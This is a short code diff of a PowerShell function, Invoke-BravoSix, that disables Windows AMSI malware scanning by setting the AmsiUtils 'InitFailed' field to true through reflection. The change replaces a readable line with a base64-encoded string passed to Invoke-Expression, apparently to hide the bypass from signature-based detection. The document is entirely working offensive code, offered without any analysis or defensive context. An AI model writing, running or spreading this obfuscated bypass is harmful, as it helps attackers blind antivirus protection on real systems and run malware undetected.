@@ -5,7 +5,7 @@ function Invoke-BravoSix() {
     }
 
     $t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like "*iUtils") {$u=$_}}
-    $fs = $u.GetFields('NonPublic,Static') | foreach {if ($_.Name -like "*InitFailed") {$f=$_}}
+    Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABmAHMAIAA9ACAAJAB1AC4ARwBlAHQARgBpAGUAbABkAHMAKAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApACAAfAAgAGYAbwByAGUAYQBjAGgAIAB7AGkAZgAgACgAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBJAG4AaQB0AEYAYQBpAGwAZQBkACIAKQAgAHsAJABmAD0AJABfAH0AfQA=")))
     $f.SetValue($null,$true)
 }
 
